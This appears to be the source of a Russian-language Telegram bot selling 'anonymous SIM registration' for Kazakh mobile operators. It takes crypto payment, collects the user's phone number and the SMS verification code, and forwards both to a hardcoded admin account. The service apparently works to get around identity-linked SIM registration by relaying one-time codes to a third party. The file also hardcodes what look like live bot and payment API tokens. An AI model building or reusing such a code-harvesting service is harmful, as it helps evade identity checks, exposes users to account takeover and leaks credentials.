import asyncio
import logging
import re
from typing import Dict, List, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiocryptopay import AioCryptoPay

# ================= НАСТРОЙКИ (ПЕРЕНЕСЕНО ВВЕРХ) =================
TOKEN = "8644586406:AAE77FSG_ddArp7DnhkpMu8HtQy5SaqItgE" # ОБНОВЛЕННЫЙ ТОКЕН
ADMIN_ID = 8209617821
CRYPTO_TOKEN = "553031:AAYPKOXkV5DTYcbIKdQYUlhLFwrI9Ah0YYG"

# ПЕРЕКЛЮЧАТЕЛЬ: True - бесплатно (тест), False - платно
FREE_MODE = False

PRICE_USD = 2.58

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())
crypto = AioCryptoPay(token=CRYPTO_TOKEN.strip())

router = Router()
dp.include_router(router)

class RegForm(StatesGroup):
    operator = State()
    phone = State()

pending_requests: List[Dict[str, Any]] = []

# ================= КЛАВИАТУРЫ =================
def get_main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📞 Зарегистрировать номер")]],
        resize_keyboard=True
    )

def get_operators_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Activ"), KeyboardButton(text="Tele2"), KeyboardButton(text="Altel")],
            [KeyboardButton(text="← Назад")]
        ],
        resize_keyboard=True
    )

# ================= ХЕНДЛЕРЫ =================
@router.message(CommandStart())
async def cmd_start(message: Message):
    status = "🆓 ТЕСТОВЫЙ РЕЖИМ (БЕСПЛАТНО)" if FREE_MODE else f"💰 ЦЕНА: ${PRICE_USD}"
    await message.answer(
        f"👋 Привет! Анонимная регистрация SIM.\n{status}", 
        reply_markup=get_main_kb()
    )

@router.message(F.text == "📞 Зарегистрировать номер")
async def start_reg(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("📊 Выбери оператора:", reply_markup=get_operators_kb())
    await state.set_state(RegForm.operator)

@router.message(F.text == "← Назад")
async def back_to_main(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Главное меню:", reply_markup=get_main_kb())

@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
async def choose_op(message: Message, state: FSMContext):
    await state.update_data(operator=message.text)
    await message.answer(f"📱 Оператор: {message.text}\nВведи номер (77xxxxxxxx):")
    await state.set_state(RegForm.phone)

@router.message(RegForm.phone)
async def process_phone(message: Message, state: FSMContext):
    phone = re.sub(r"\D", "", message.text)
    if len(phone) < 10:
        return await message.answer("❌ Ошибка в номере. Введи еще раз:")
    
    data = await state.get_data()
    rid = len(pending_requests) + 1
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"

    if FREE_MODE:
        pending_requests.append({
            "id": rid, "user_id": message.chat.id, "username": user_info,
            "phone": phone, "operator": data['operator'], "status": "waiting_sms"
        })
        await message.answer("✅ Заявка принята! Теперь введите код из СМС:")
        await bot.send_message(ADMIN_ID, f"🆓 ТЕСТ: #{rid}\n👤 Юзер: {user_info}\n📱 Номер: {phone}")
        await state.clear()
        return

    try:
        invoice = await crypto.create_invoice(asset='USDT', amount=PRICE_USD)
        pending_requests.append({
            "id": invoice.invoice_id, "user_id": message.chat.id, "username": user_info,
            "phone": phone, "operator": data['operator'], "status": "waiting_pay"
        })
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить", url=invoice.pay_url)],
            [InlineKeyboardButton(text="✅ Проверить оплату", callback_data=f"check_{invoice.invoice_id}")]
        ])
        await message.answer(f"🧾 Заявка #{invoice.invoice_id}\n💰 Сумма: {PRICE_USD} USDT", reply_markup=kb)
        await state.clear()
    except Exception as e:
        logging.error(f"Error: {e}")
        await message.answer("⚠️ Ошибка системы платежей.")

@router.callback_query(F.data.startswith("check_"))
async def check_payment(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    invoices = await crypto.get_invoices(status='paid')
    is_paid = any(inv.invoice_id == rid for inv in (invoices or []))

    if is_paid:
        for req in pending_requests:
            if req["id"] == rid:
                req["status"] = "waiting_sms"
                await callback.message.edit_text("💰 Оплачено! Введите код из СМС:")
                break
    else:
        await callback.answer("❌ Оплата не найдена.", show_alert=True)

@router.message()
async def catch_sms(message: Message):
    if message.chat.id == ADMIN_ID: return
    
    # Поиск активной заявки, ждущей СМС
    req = next((r for r in pending_requests if r["user_id"] == message.chat.id and r["status"] == "waiting_sms"), None)
    
    if req and message.text.isdigit():
        await message.answer("⏳ Код принят. Ожидайте.")
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🏁 Завершить", callback_data=f"done_{req['id']}")]])
        await bot.send_message(
            ADMIN_ID, 
            f"🔑 КОД: `{message.text}`\n👤 От: {req['username']}\n📱 №: {req['phone']}", 
            reply_markup=kb
        )
    elif req:
        await message.answer("Введите только цифры из СМС!")

@router.callback_query(F.data.startswith("done_"))
async def finish_job(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "completed"
            await bot.send_message(req["user_id"], "🎉 Регистрация успешно завершена!")
            await callback.message.edit_text(f"🏁 Заявка #{rid} закрыта.")
            break
    await callback.answer()

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
